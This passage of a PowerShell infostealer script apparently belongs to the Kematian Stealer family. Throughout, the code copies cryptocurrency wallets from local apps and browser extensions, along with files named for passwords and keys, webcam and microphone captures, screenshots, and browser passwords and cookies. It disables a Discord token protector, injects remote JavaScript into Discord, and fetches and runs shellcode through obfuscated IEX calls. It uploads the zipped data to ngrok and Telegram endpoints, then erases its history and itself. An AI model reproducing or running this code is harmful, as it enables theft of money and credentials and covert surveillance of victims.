                "Atomic"           = Join-Path $env:appdata      "\Atomic\Local Storage\leveldb"
                "Bitcoin"          = Join-Path $env:appdata      "\Bitcoin\wallets"
                "Bytecoin"         = Join-Path $env:appdata      "\bytecoin\*.wallet"
                "Coinomi"          = Join-Path $env:localappdata "Coinomi\Coinomi\wallets"
                "Dash"             = Join-Path $env:appdata      "\DashCore\wallets"
                "Electrum"         = Join-Path $env:appdata      "\Electrum\wallets"
                "Ethereum"         = Join-Path $env:appdata      "\Ethereum\keystore"
                "Exodus"           = Join-Path $env:appdata      "\Exodus\exodus.wallet"
                "Guarda"           = Join-Path $env:appdata      "\Guarda\Local Storage\leveldb"
                "com.liberty.jaxx" = Join-Path $env:appdata      "\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb"
                "Litecoin"         = Join-Path $env:appdata      "\Litecoin\wallets"
                "MyMonero"         = Join-Path $env:appdata      "\MyMonero\*.mmdb"
                "Monero GUI"       = Join-Path $env:appdata      "Documents\Monero\wallets\"
	        "WalletWasabi"     = Join-Path $env:appdata      "WalletWasabi\Client\Wallets"
            }
        }
        $zephyr_path = "$env:appdata\Zephyr\wallets"
        New-Item -ItemType Directory -Path "$folder_crypto\Zephyr" -Force | Out-Null
        if (Test-Path $zephyr_path) { Get-ChildItem -Path $zephyr_path -Filter "*.keys" -Recurse | Copy-Item -Destination "$folder_crypto\Zephyr" -Force }	
        foreach ($wallet in $wallet_paths.Keys) {
            foreach ($pathName in $wallet_paths[$wallet].Keys) {
                $sourcePath = $wallet_paths[$wallet][$pathName]
                if (Test-Path $sourcePath) {
					#!! WALLET COPY
					$global:moneyCounter += 1
					#--------------
                    $destination = Join-Path -Path $folder_crypto -ChildPath $pathName
                    New-Item -ItemType Directory -Path $destination -Force | Out-Null
                    Copy-Item -Path $sourcePath -Recurse -Destination $destination -Force
                }
            }
        }
    }
    Local_Crypto_Wallets
	
    function browserwallets {
        $browserPaths = @{
            "Brave"       = Join-Path $env:LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data"
            "Chrome"      = Join-Path $env:LOCALAPPDATA "Google\Chrome\User Data"
            "Chromium"    = Join-Path $env:LOCALAPPDATA "Chromium\User Data"
            "Edge"        = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data"
            "EpicPrivacy" = Join-Path $env:LOCALAPPDATA "Epic Privacy Browser\User Data"
            "Iridium"     = Join-Path $env:LOCALAPPDATA "Iridium\User Data"
            "Opera"       = Join-Path $env:APPDATA "Opera Software\Opera Stable"
            "OperaGX"     = Join-Path $env:APPDATA "Opera Software\Opera GX Stable"
            "Vivaldi"     = Join-Path $env:LOCALAPPDATA "Vivaldi\User Data"
            "Yandex"      = Join-Path $env:LOCALAPPDATA "Yandex\YandexBrowser\User Data"
        }
        $walletDirs = @{
            "dlcobpjiigpikoobohmabehhmhfoodbb" = "Argent X"
            "fhbohimaelbohpjbbldcngcnapndodjp" = "Binance Chain Wallet"
            "jiidiaalihmmhddjgbnbgdfflelocpak" = "BitKeep Wallet"
            "bopcbmipnjdcdfflfgjdgdjejmgpoaab" = "BlockWallet"
            "odbfpeeihdkbihmopkbjmoonfanlbfcl" = "Coinbase"
            "hifafgmccdpekplomjjkcfgodnhcellj" = "Crypto.com"
            "kkpllkodjeloidieedojogacfhpaihoh" = "Enkrypt"
            "mcbigmjiafegjnnogedioegffbooigli" = "Ethos Sui"
            "aholpfdialjgjfhomihkjbmgjidlcdno" = "ExodusWeb3"
            "hpglfhgfnhbgpjdenjgmdgoeiappafln" = "Guarda"
            "dmkamcknogkgcdfhhbddcghachkejeap" = "Keplr"
            "afbcbjpbpfadlkmhmclhkeeodmamcflc" = "MathWallet"
            "nkbihfbeogaeaoehlefnkodbefgpgknn" = "Metamask"
            "ejbalbakoplchlghecdalmeeeajnimhm" = "Metamask2"
            "mcohilncbfahbmgdjkbpemcciiolgcge" = "OKX"
            "jnmbobjmhlngoefaiojfljckilhhlhcj" = "OneKey"
            "bfnaelmomeimhlpmgjnjophhpkkoljpa" = "Phantom"
            "fnjhmkhhmkbjkkabndcnnogagogbneec" = "Ronin"
            "lgmpcpglpngdoalbgeoldeajfclnhafa" = "SafePal"
            "mfgccjchihfkkindfppnaooecgfneiii" = "TokenPocket"
            "nphplpgoakhhjchkkhmiggakijnkhfnd" = "Ton"
            "ibnejdfjmmkpcnlpebklmnkoeoihofec" = "TronLink"
            "egjidjbpglichdcondbcbdnbeeppgdph" = "Trust Wallet"
            "amkmjjmmflddogmhpjloimipbofnfjih" = "Wombat"
            "heamnjbnflcikcggoiplibfommfbkjpj" = "Zeal"       
        }
        foreach ($browser in $browserPaths.GetEnumerator()) {
            $browserName = $browser.Key
            $browserPath = $browser.Value
            if (Test-Path $browserPath) {
                Get-ChildItem -Path $browserPath -Recurse -Directory -Filter "Local Extension Settings" -ErrorAction SilentlyContinue | ForEach-Object {
                    $localExtensionsSettingsDir = $_.FullName
                    foreach ($walletDir in $walletDirs.GetEnumerator()) {
                        $walletKey = $walletDir.Key
                        $walletName = $walletDir.Value
                        $extentionPath = Join-Path $localExtensionsSettingsDir $walletKey
                        if (Test-Path $extentionPath) {
                            if (Get-ChildItem $extentionPath -ErrorAction SilentlyContinue) {
                                try {
									#!! WALLET COPY
									$global:moneyCounter += 1
									#--------------
                                    $wallet_browser = "$walletName ($browserName)"
                                    $walletDirPath = Join-Path $folder_crypto $wallet_browser
                                    New-Item -ItemType Directory -Path $walletDirPath -Force | out-null
                                    Copy-Item -Path $extentionPath -Destination $walletDirPath -Recurse -Force
                                    $locationFile = Join-Path $walletDirPath "Location.txt"
                                    $extentionPath | Out-File -FilePath $locationFile -Force
                                    Write-Host "[!] Copied $walletName wallet from $extentionPath to $walletDirPath" -ForegroundColor Green
                                }
                                catch {
                                    Write-Host "[!] Failed to copy $walletName wallet from $extentionPath" -ForegroundColor Red
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    browserwallets
 
    Write-Host "[!] Session Grabbing Ended" -ForegroundColor Green
    
    #-------------------#
    #  FILE GRABBER     #
    #-------------------#
    function FilesGrabber {
        $item_limit = 100
        $allowedExtensions = @("*.jpg", "*.png", "*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log", "*.pem", "*.ppk", "*.key", "*.pfx")
        $keywords = @("2fa", "acc", "account", "auth", "backup", "bank", "binance", "bitcoin", "bitwarden", "btc", "casino", "code", "coinbase ", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "keepass", "keys", "kraken", "kucoin", "lastpass", "ledger", "login", "mail", "memo", "metamask", "mnemonic", "nordpass", "note", "pass", "passphrase", "proton", "paypal", "pgp", "private", "pw", "recovery", "remote", "roboform", "secret", "seedphrase", "server", "skrill", "smtp", "solana", "syncthing", "tether", "token", "trading", "trezor", "venmo", "vault", "wallet")
        $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
        foreach ($path in $paths) {
            $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
                $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
            } | Select-Object -First $item_limit
            foreach ($file in $files) {
                $destination = Join-Path -Path $important_files -ChildPath $file.Name
                if ($file.FullName -ne $destination) {
                    Copy-Item -Path $file.FullName -Destination $destination -Force
                }
            }
        }
        # Send info about the keywords that match a grabbed file
        $keywordsUsed = @()
        foreach ($keyword in $keywords) {
            foreach ($file in (Get-ChildItem -Path $important_files -Recurse)) {
                if ($file.Name -like "*$keyword*") {
                    if ($file.Length -lt 1mb) {
                        if ($keywordsUsed -notcontains $keyword) {
                            $keywordsUsed += $keyword
                            $keywordsUsed | Out-File "$folder_general\Important_Files_Keywords.txt" -Force
                        }
                    }
                }
            }
        }
    }
    FilesGrabber

    Set-Location "$env:LOCALAPPDATA\Temp"

    # webcam 
    if ($webcam) {
        Write-Host "[!] Capturing an image with Webcam" -ForegroundColor Green
        $webcam = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/webcam.ps1")
        $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$webcam')"
        $invokewebcam = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
        $invokewebcam.WaitForExit()
        $webcam_image = "$env:temp\webcam.png"
        if (Test-Path -Path $webcam_image) {
            Move-Item -Path $webcam_image -Destination $folder_general
            Write-Host "[!] The webcam image moved successfully to $folder_general" -ForegroundColor Green
        } else {
            Write-Host "[!] The webcam image does not exist." -ForegroundColor Red
        }
    }

    # record mic for 10 sec
    if ($record_mic) {
        Write-Host "[!] Recording PC MIC for 10 seconds" -ForegroundColor Green
        $mic = ("https://github.com/Somali-Devs/Kematian-Stealer/raw/main/frontend-src/mic.ps1")
        $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$mic')"
        $invokemic = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
        $invokemic.WaitForExit()
        $mic_file = "$env:temp\mic.wav"
        if (Test-Path -Path $mic_file) {
            Move-Item -Path $mic_file -Destination $folder_general
            Write-Host "[!] The mic.wav file moved successfully to $folder_general" -ForegroundColor Green
        } else {
            Write-Host "[!] The mic.wav file does not exist." -ForegroundColor Red
        }
    }

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force -ErrorAction 'SilentlyContinue'
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force -ErrorAction 'SilentlyContinue'
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }


    $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
    $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")

    foreach ($path in $discPaths) {
        $skibidipath = Join-Path $locAppData $path
        if (-not (Test-Path $skibidipath)) {
            continue
        }
        Get-ChildItem $skibidipath -Recurse | ForEach-Object {
            if ($_ -is [System.IO.DirectoryInfo] -and ($_.FullName -match "discord_desktop_core")) {
                $files = Get-ChildItem $_.FullName
                foreach ($file in $files) {
                    if ($file.Name -eq "index.js") {
                        $webClient = New-Object System.Net.WebClient
                        $content = $webClient.DownloadString("https://ratte.ngrok.app/main/injection.js")
                        if ($content -ne "") {
                            $data_webhook = $webhook -replace "/data", "/injection"
                            $replacedContent = $content -replace "%WEBHOOK%", $data_webhook
                            $replacedContent | Set-Content -Path $file.FullName -Force
                        }
                    }
                }
            }
        }
    }
    
    #Shellcode loader, Thanks to https://github.com/TheWover for making this possible !
    
    Write-Host "[!] Injecting Shellcode" -ForegroundColor Green
    $kematian_shellcode = ("https://ratte.ngrok.app/main/shellcode.ps1")
    $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$kematian_shellcode')"
    $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
    $proc.WaitForExit()
    Write-Host "[!] Shellcode Injection Completed" -ForegroundColor Green

    $main_temp = "$env:localappdata\temp"

    $top = ($screen.Bounds.Top | Measure-Object -Minimum).Minimum
    $left = ($screen.Bounds.Left | Measure-Object -Minimum).Minimum
    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$main_temp\screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()

    Write-Host "[!] Screenshot Captured" -ForegroundColor Green

    Move-Item "$main_temp\discord.json" $folder_general -Force -EA Ignore    
    Move-Item "$main_temp\screenshot.png" $folder_general -Force -EA Ignore
    Move-Item -Path "$main_temp\autofill.json" -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\cards.json" -Destination "$browser_data" -Force -EA Ignore
    #move any file that starts with cookies_netscape
    Get-ChildItem -Path $main_temp -Filter "cookies_netscape*" | Move-Item -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\downloads.json" -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\history.json" -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\passwords.json" -Destination "$browser_data" -Force -EA Ignore
    Move-Item -Path "$main_temp\bookmarks.json" -Destination "$browser_data" -Force -EA Ignore

	#Count Passwords
	$jsonFilePath = "$browser_data\passwords.json"
	$jsonContent = Get-Content -Path $jsonFilePath -Raw
	$passwordCounter = ($jsonContent -split '"password":').Length
	#Count Coockies
	$cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
	foreach ($file in $cookieFiles) {
		$lineCount = (Get-Content -Path $file.FullName).Count
		$cookieCounter += $lineCount
	}

    #remove empty dirs
    do {
        $dirs = Get-ChildItem $folder_general -Directory -Recurse | Where-Object { (Get-ChildItem $_.FullName).Count -eq 0 } | Select-Object -ExpandProperty FullName
        $dirs | ForEach-Object { Remove-Item $_ -Force }
    } while ($dirs.Count -gt 0)
    
    Write-Host "[!] Getting information about the extracted data" -ForegroundColor Green
    
    function ProcessCookieFiles {
        $domaindetects = New-Item -ItemType Directory -Path "$folder_general\DomainDetects" -Force
        $cookieFiles = Get-ChildItem -Path $browser_data -Filter "cookies_netscape*"
        foreach ($file in $cookieFiles) {
            $outputFileName = $file.Name -replace "^cookies_netscape_|-Browser"
            $fileContents = Get-Content -Path $file.FullName
            $domainCounts = @{}
            foreach ($line in $fileContents) {
                if ($line -match "^\s*(\S+)\s") {
                    $domain = $matches[1].TrimStart('.')
                    if ($domainCounts.ContainsKey($domain)) {
                        $domainCounts[$domain]++
                    }
                    else {
                        $domainCounts[$domain] = 1
                    }
                }
            }
            $outputString = ($domainCounts.GetEnumerator() | Sort-Object Name | ForEach-Object { "$($_.Name) ($($_.Value))" }) -join "`n"
            $outputFilePath = Join-Path -Path $domaindetects -ChildPath $outputFileName
            Set-Content -Path $outputFilePath -Value $outputString
        }
    }
    ProcessCookieFiles 

    $b64_uuid = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($uuid))
    $b64_countrycode = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($countrycode))
    $b64_hostname = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($hostname))
    $b64_filedate = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($filedate))
    $b64_timezoneString = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($timezoneString))
    #$zipFileName = "$uuid`_$countrycode`_$hostname`_$filedate`_$timezoneString.zip"
    $zipFileName = "$b64_uuid`_$b64_countrycode`_$b64_hostname`_$b64_filedate`_$b64_timezoneString.zip"
    $zipFilePath = "$env:LOCALAPPDATA\Temp\$zipFileName"

    Compress-Archive -Path "$folder_general" -DestinationPath "$zipFilePath" -Force

    Write-Host $ZipFilePath
    Write-Host "[!] Uploading the extracted data" -ForegroundColor Green
	
	#-----------------------------------------------
	Start-Sleep -Seconds 10
	#REZERV--------------
	$apiKey = "encrypthub_asseq2QSsxzc"
	$fileName = [System.IO.Path]::GetFileName($zipFilePath)
    $base64FileName = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($fileName))
	$url = "https://mainstream.ngrok.app/?method=UploadFile&filename=$base64FileName"
	Write-Host "[!] Archive sending to: $url"
	$RezWebClient = New-Object System.Net.WebClient
	$RezWebClient.Headers.Add("Api-Key", $apiKey)
	$RezWebClient.UploadFile($url, $zipFilePath)
	Write-Host "[!] Archive sended"
	#--------------------------------------
	Start-Sleep -Seconds 10
	#--------------------------------------
	Send-TelegramFile -ZIPfile $zipFilePath -MoneyCount $moneyCounter -PasswdCount $passwordCounter -CookieCount $cookieCounter -messagersCount $messagersCounter -gamesCount $gamesCounter
	#-----------------------------------------------
	Start-Sleep -Seconds 15
	#-----------------------------------------------
	#Remove-Item "$zipFilePath" -Force
	#-----------------------------------------------
	$greenCheckMark = [char]0x2705
	$redCrossMark = [char]0x274C
	
	$svpnCounter = if ($global:vpnCounter) { $greenCheckMark } else { $redCrossMark }
	$swinscpCounter = if ($global:winscpCounter) { $greenCheckMark } else { $redCrossMark }
	$sftpCounter = if ($global:ftpCounter) { $greenCheckMark } else { $redCrossMark }
	$svncCounter = if ($global:vncCounter) { $greenCheckMark } else { $redCrossMark }
	
	$Omessage = "$($redExclamation) [MAIN] NEW LOG`n--------------`n$($cookieSymbol) $cookieCounter $($passwordSymbol) $passwordCounter $($MoneySymbol) $moneyCounter $($messageSymbol) $messagersCounter $($joystickSymbol) $gamesCounter`n--------------`nVPN: $svpnCounter`nFTP: $sftpCounter`nWinSCP: $swinscpCounter`nVNC: $svncCounter`n--------------"
	Send-TelegramMessage -message $Omessage
	#-----------------------------------------------
	
	
	
    Write-Host "[!] The extracted data was sent successfully !" -ForegroundColor Green
    # cleanup
    Remove-Item "$env:appdata\Kematian" -Force -Recurse
}

if (CHECK_AND_PATCH -eq $true) {
	$greenCheckMark = [char]0x2705
	$message = "$($greenCheckMark) [STEAL] Working..."
    Send-TelegramMessage -message $message	
    KDMUTEX
    if (!($debug)) {
        CriticalProcess -MethodName InvokeRtlSetProcessIsCritical -IsCritical 0 -Unknown1 0 -Unknown2 0
    }
    $script:SingleInstanceEvent.Close()
    $script:SingleInstanceEvent.Dispose()
    #removes history
    I'E'X([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("UmVtb3ZlLUl0ZW0gKEdldC1QU3JlYWRsaW5lT3B0aW9uKS5IaXN0b3J5U2F2ZVBhdGggLUZvcmNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl")))
    if ($debug) {
        Read-Host -Prompt "Press Enter to continue"
    }
    if ($melt) { 
        try {
            Remove-Item $pscommandpath -force
        }
        catch {}
    }
}
else {
	$message = "$($redExclamation) [STEAL] Request Admin"
    Send-TelegramMessage -message $message
    Write-Host "[!] Please run as admin !" -ForegroundColor Red
    Start-Sleep -s 1
    Request-Admin
}
# SIG # Begin signature block
# MIIpoAYJKoZIhvcNAQcCoIIpkTCCKY0CAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCDZDcULjcKql/cs
# D9xiqYtF94uWxUiPpdVT3u6/UzHHtqCCDxAwggboMIIE0KADAgECAhB3vQ4Ft1kL
# th1HYVMeP3XtMA0GCSqGSIb3DQEBCwUAMFMxCzAJBgNVBAYTAkJFMRkwFwYDVQQK
# ExBHbG9iYWxTaWduIG52LXNhMSkwJwYDVQQDEyBHbG9iYWxTaWduIENvZGUgU2ln
# bmluZyBSb290IFI0NTAeFw0yMDA3MjgwMDAwMDBaFw0zMDA3MjgwMDAwMDBaMFwx
# CzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTIwMAYDVQQD
# EylHbG9iYWxTaWduIEdDQyBSNDUgRVYgQ29kZVNpZ25pbmcgQ0EgMjAyMDCCAiIw
# DQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMsg75ceuQEyQ6BbqYoj/SBerjgS
# i8os1P9B2BpV1BlTt/2jF+d6OVzA984Ro/ml7QH6tbqT76+T3PjisxlMg7BKRFAE
# eIQQaqTWlpCOgfh8qy+1o1cz0lh7lA5tD6WRJiqzg09ysYp7ZJLQ8LRVX5YLEeWa
# tSyyEc8lG31RK5gfSaNf+BOeNbgDAtqkEy+FSu/EL3AOwdTMMxLsvUCV0xHK5s2z
# BZzIU+tS13hMUQGSgt4T8weOdLqEgJ/SpBUO6K/r94n233Hw0b6nskEzIHXMsdXt
# HQcZxOsmd/KrbReTSam35sOQnMa47MzJe5pexcUkk2NvfhCLYc+YVaMkoog28vmf
# vpMusgafJsAMAVYS4bKKnw4e3JiLLs/a4ok0ph8moKiueG3soYgVPMLq7rfYrWGl
# r3A2onmO3A1zwPHkLKuU7FgGOTZI1jta6CLOdA6vLPEV2tG0leis1Ult5a/dm2tj
# IF2OfjuyQ9hiOpTlzbSYszcZJBJyc6sEsAnchebUIgTvQCodLm3HadNutwFsDeCX
# pxbmJouI9wNEhl9iZ0y1pzeoVdwDNoxuz202JvEOj7A9ccDhMqeC5LYyAjIwfLWT
# yCH9PIjmaWP47nXJi8Kr77o6/elev7YR8b7wPcoyPm593g9+m5XEEofnGrhO7izB
# 36Fl6CSDySrC/blTAgMBAAGjggGtMIIBqTAOBgNVHQ8BAf8EBAMCAYYwEwYDVR0l
# BAwwCgYIKwYBBQUHAwMwEgYDVR0TAQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUJZ3Q
# /FkJhmPF7POxEztXHAOSNhEwHwYDVR0jBBgwFoAUHwC/RoAK/Hg5t6W0Q9lWULvO
# ljswgZMGCCsGAQUFBwEBBIGGMIGDMDkGCCsGAQUFBzABhi1odHRwOi8vb2NzcC5n
# bG9iYWxzaWduLmNvbS9jb2Rlc2lnbmluZ3Jvb3RyNDUwRgYIKwYBBQUHMAKGOmh0
# dHA6Ly9zZWN1cmUuZ2xvYmFsc2lnbi5jb20vY2FjZXJ0L2NvZGVzaWduaW5ncm9v
# dHI0NS5jcnQwQQYDVR0fBDowODA2oDSgMoYwaHR0cDovL2NybC5nbG9iYWxzaWdu
# LmNvbS9jb2Rlc2lnbmluZ3Jvb3RyNDUuY3JsMFUGA1UdIAROMEwwQQYJKwYBBAGg
# MgECMDQwMgYIKwYBBQUHAgEWJmh0dHBzOi8vd3d3Lmdsb2JhbHNpZ24uY29tL3Jl
# cG9zaXRvcnkvMAcGBWeBDAEDMA0GCSqGSIb3DQEBCwUAA4ICAQAldaAJyTm6t6E5
# iS8Yn6vW6x1L6JR8DQdomxyd73G2F2prAk+zP4ZFh8xlm0zjWAYCImbVYQLFY4/U
# ovG2XiULd5bpzXFAM4gp7O7zom28TbU+BkvJczPKCBQtPUzosLp1pnQtpFg6bBNJ
# +KUVChSWhbFqaDQlQq+WVvQQ+iR98StywRbha+vmqZjHPlr00Bid/XSXhndGKj0j
# fShziq7vKxuav2xTpxSePIdxwF6OyPvTKpIz6ldNXgdeysEYrIEtGiH6bs+XYXvf
# cXo6ymP31TBENzL+u0OF3Lr8psozGSt3bdvLBfB+X3Uuora/Nao2Y8nOZNm9/Lws
# 80lWAMgSK8YnuzevV+/Ezx4pxPTiLc4qYc9X7fUKQOL1GNYe6ZAvytOHX5OKSBoR
# HeU3hZ8uZmKaXoFOlaxVV0PcU4slfjxhD4oLuvU/pteO9wRWXiG7n9dqcYC/lt5y
# A9jYIivzJxZPOOhRQAyuku++PX33gMZMNleElaeEFUgwDlInCI2Oor0ixxnJpsoO
# qHo222q6YV8RJJWk4o5o7hmpSZle0LQ0vdb5QMcQlzFSOTUpEYck08T7qWPLd0jV
# +mL8JOAEek7Q5G7ezp44UCb0IXFl1wkl1MkHAHq4x/N36MXU4lXQ0x72f1LiSY25
# EXIMiEQmM2YBRN/kMw4h3mKJSAfa9TCCCCAwggYIoAMCAQICDArubE/GQ7e0PDgW
# CzANBgkqhkiG9w0BAQsFADBcMQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFs
# U2lnbiBudi1zYTEyMDAGA1UEAxMpR2xvYmFsU2lnbiBHQ0MgUjQ1IEVWIENvZGVT
# aWduaW5nIENBIDIwMjAwHhcNMjQwMTI2MDkyODEwWhcNMjUwMTI2MDkyODEwWjCC
# AYQxHTAbBgNVBA8MFFByaXZhdGUgT3JnYW5pemF0aW9uMRswGQYDVQQFExI5MTQ0
# MDYwNU1BQ1JKTEZNWEwxEzARBgsrBgEEAYI3PAIBAxMCQ04xGjAYBgsrBgEEAYI3
# PAIBAhMJR3Vhbmdkb25nMRcwFQYLKwYBBAGCNzwCAQETBkZvc2hhbjELMAkGA1UE
# BhMCQ04xEjAQBgNVBAgTCUd1YW5nZG9uZzEPMA0GA1UEBxMGRm9zaGFuMUIwQAYD
# VQQJEzlSb29tIDUwMiwgTm8uMjIsIEppYW5nYnUgUm9hZCwgRGFsaSBUb3duLCBO
# YW5oYWkgRGlzdHJpY3QxQjBABgNVBAoTOUlub2VsbGFjdCBFbG91YmFudFRlY2gg
# T3B0aW1pemF0aW9uIEluZm9ybWF0aW9uIENvLiwgTHRkLjFCMEAGA1UEAxM5SW5v
# ZWxsYWN0IEVsb3ViYW50VGVjaCBPcHRpbWl6YXRpb24gSW5mb3JtYXRpb24gQ28u
# LCBMdGQuMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAu80gUYQNVvpV
# d4jkM0BBrXVTSFyjMvTl80g7o/jQcUq+ELPWgTTQ0GtCAy+CnTSDb15RJVJ2C6uc
# 9INsvjmh4noWJKosS5Ox7NP6T8HIP8MGLabu08hWbw+QI247N/7ah7rDrQQPSW2E
# WOInu4jwkZlfEo9fA71SgYL/zcNtKz5PWQh48dU1IxBT3iQGSEZ6BPt3Yp5ZFErQ
# MxogxYSr7wE6noq/6V2WPqPvOrh6GW6iTiv95uvwtwHql7jH0yiDolu2LPBfB39d
# 2v89YGbweZvle6Kr+GuKX5F1vHfBcuqcvZpX/uiSwIKda7BerBKyDsBBq3gJ1H4x
# o+4nnWSRFyg6jflx9oqnpvI/wUYv75NFOo/CKLqqfDHAZz2M8SsJRM0DGX4rOUaG
# TeriiE40xxuQcgwXT7grevKoTNFaYGnjAnZlhrSNUgJDdrzFSqtiTAdWCPr4GJKj
# Zag25IlkDr8X0KFL+oDYtQwlYE2jenwM13rdiBjTVFaMGMOpXsJw+uuARlFWlq/S
# 387roU8tPI1pG4Bh6bM4rgISrheEQARm8Uhdi7UeEIddswSM7DXgWQN6vf4LTRQx
# RM4/6nKzixzrs/g8N4DKnHCs0Ukh9orU2xpG8MzQa7eNjW+7oS/ok8MkHTGqv9nc
# TPhTREgmlwPWZadB+hztM9aBSDUaefECAwEAAaOCAbYwggGyMA4GA1UdDwEB/wQE
# AwIHgDCBnwYIKwYBBQUHAQEEgZIwgY8wTAYIKwYBBQUHMAKGQGh0dHA6Ly9zZWN1
# cmUuZ2xvYmFsc2lnbi5jb20vY2FjZXJ0L2dzZ2NjcjQ1ZXZjb2Rlc2lnbmNhMjAy
# MC5jcnQwPwYIKwYBBQUHMAGGM2h0dHA6Ly9vY3NwLmdsb2JhbHNpZ24uY29tL2dz
# Z2NjcjQ1ZXZjb2Rlc2lnbmNhMjAyMDBVBgNVHSAETjBMMEEGCSsGAQQBoDIBAjA0
# MDIGCCsGAQUFBwIBFiZodHRwczovL3d3dy5nbG9iYWxzaWduLmNvbS9yZXBvc2l0
# b3J5LzAHBgVngQwBAzAJBgNVHRMEAjAAMEcGA1UdHwRAMD4wPKA6oDiGNmh0dHA6
# Ly9jcmwuZ2xvYmFsc2lnbi5jb20vZ3NnY2NyNDVldmNvZGVzaWduY2EyMDIwLmNy
# bDATBgNVHSUEDDAKBggrBgEFBQcDAzAfBgNVHSMEGDAWgBQlndD8WQmGY8Xs87ET
# O1ccA5I2ETAdBgNVHQ4EFgQUCxvJRiLTI4ldicnHVMMy0MAEyfUwDQYJKoZIhvcN
# AQELBQADggIBAK/4bqH6XRiOspv+xIPLDEqGxkkQHmT2Gp9wHSl4FYflpU/DjG5t
# RlDSaoiMJ1X4NHg5ig0dbehanU18fnrNF6h8FEiQfWJ77oqPNoZ9jxws7jxBiTSm
# aeLmGToMM2LB5S3KZ4BF3Z9ynyFgs3bUuDoLeGEcjJt0lts9VxWXKcx2Wtjr8ePG
# YuS8m1IupxZ9gxU7/KAsDthSjXQ2gKiOZeF3kSACclr1QPmIhTNKgQxgg0wjxB47
# Bx5hVg7PPgz+IrzMvZYEBj5Yn4IN8ITIEN3lWwlcbqJRTK69zrRqwX36MT304XVs
# CYU92HzdQWIEmz58k+D1DQiwjA+B2PcZvjNpncl0oH9l7mEnb01Y3reiw6sb2EIG
# Esxjr+DypPlWTTcPYIOpvrbMmGRyzAsf3JoNSymen/uJylP5QTMa0YkL0bF+5zBs
# 9fQcDskkyvsncfexRxWSnkej0m1I/ePJKPR93sqUQEjnkgL78HFQyw08SM0H+m99
# 1FenzywKAUrfZrxSGBB2iagoVEXXpbfxGpBKNJaVkG6p0KAxzywfQHAXHP3dVLH6
# Y30XAqw7pryFEywGpulbTKpB27CqlXSWzFpjCJHsFCEuKQBmb4bxrHvj76Gg91cu
# IZiRwJ10CzAUoQ6px6qflAHjAAt44k7o1sxYn3Li3BqvkTa4q9rN95XgMYIZ5jCC
# GeICAQEwbDBcMQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFsU2lnbiBudi1z
# YTEyMDAGA1UEAxMpR2xvYmFsU2lnbiBHQ0MgUjQ1IEVWIENvZGVTaWduaW5nIENB
# IDIwMjACDArubE/GQ7e0PDgWCzANBglghkgBZQMEAgEFAKB8MBAGCisGAQQBgjcC
# AQwxAjAAMBkGCSqGSIb3DQEJAzEMBgorBgEEAYI3AgEEMBwGCisGAQQBgjcCAQsx
# DjAMBgorBgEEAYI3AgEVMC8GCSqGSIb3DQEJBDEiBCDZBV8cLy4jPDAPw9+GxSgH
# AO2ecascBiVdVqMS+5YR0TANBgkqhkiG9w0BAQEFAASCAgBIIDujGfD76yl7D5w/
